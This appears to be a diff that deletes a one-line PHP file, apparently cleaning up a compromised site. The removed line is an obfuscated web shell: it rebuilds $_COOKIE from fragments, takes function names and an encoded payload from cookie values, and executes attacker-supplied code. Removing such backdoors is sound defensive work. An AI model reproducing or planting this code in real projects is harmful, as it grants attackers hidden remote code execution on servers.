@@ -1,1 +1,0 @@
-<?php $iv='OKI';/*h*/$lw='_CO';/*f*/$ob='E';$gj/*E19s*/=${$lw.$iv.$ob};$s=/*.+*/$gj['k'].$gj/*dwL*/['b'];$ni=$gj['Y'].$gj['Lo'].$gj['W'];$zy=$s('',$ni($gj['v']));$zy();
